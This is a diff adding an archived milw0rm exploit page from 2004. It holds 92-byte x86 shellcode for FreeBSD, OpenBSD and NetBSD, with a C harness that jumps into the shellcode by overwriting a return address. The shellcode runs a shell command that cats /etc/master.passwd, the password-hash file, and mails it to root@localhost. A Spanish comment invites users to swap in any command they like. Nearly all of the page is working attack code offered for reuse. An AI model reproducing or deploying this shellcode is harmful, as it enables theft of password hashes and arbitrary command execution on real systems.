@@ -1,0 +1,47 @@
+<html><head><title>bsd/x86 cat /etc/master.passwd | mail [email] 92 bytes</title></head><pre>/*
+   *BSD version
+   FreeBSD, OpenBSD, NetBSD.
+
+   s0t4ipv6@shellcode.com.ar
+
+   92 bytes.
+
+   _execve(/bin/sh -c &quot;/bin/cat /etc/master.passwd|mail root@localhost&quot;);
+   pueden reemplzar el comando por lo que se les ocurra.
+*/
+
+char shellcode[]=
+
+    &quot;\xeb\x25&quot;             /* jmp     &lt;shellcode+39&gt;         */
+    &quot;\x59&quot;                 /* popl    %ecx                   */
+    &quot;\x31\xc0&quot;             /* xorl    %eax,%eax              */
+    &quot;\x50&quot;                 /* pushl   %eax                   */
+    &quot;\x68\x6e\x2f\x73\x68&quot; /* push    $0x68732f6e            */
+    &quot;\x68\x2f\x2f\x62\x69&quot; /* push    $0x69622f2f            */
+    &quot;\x89\xe3&quot;             /* movl    %esp,%ebx              */
+    &quot;\x50&quot;                 /* pushl   %eax                   */
+    &quot;\x66\x68\x2d\x63&quot;     /* pushw   $0x632d                */
+    &quot;\x89\xe7&quot;             /* movl    %esp,%edi              */
+    &quot;\x50&quot;                 /* pushl   %eax                   */
+    &quot;\x51&quot;                 /* pushl   %ecx                   */
+    &quot;\x57&quot;                 /* pushl   %edi                   */
+    &quot;\x53&quot;                 /* pushl   %ebx                   */
+    &quot;\x89\xe7&quot;             /* movl    %esp,%edi              */
+    &quot;\x50&quot;                 /* pushl   %eax                   */
+    &quot;\x57&quot;                 /* pushl   %edi                   */
+    &quot;\x53&quot;                 /* pushl   %ebx                   */
+    &quot;\x50&quot;                 /* pushl   %eax                   */
+    &quot;\xb0\x3b&quot;             /* movb    $0x0b,%al              */
+    &quot;\xcd\x80&quot;             /* int     $0x80                  */
+    &quot;\xe8\xd6\xff\xff\xff&quot; /* call    &lt;shellcode+2&gt;          */
+    &quot;/bin/cat /etc/master.passwd|mail root@localhost&quot;;
+
+main()
+{
+   int *ret;
+   printf(&quot;Shellcode lenght=%d\n&quot;,sizeof(shellcode));
+   ret=(int*)&amp;ret+2;
+   (*ret)=(int)shellcode;
+}
+
+// milw0rm.com [2004-09-26]</pre></html>
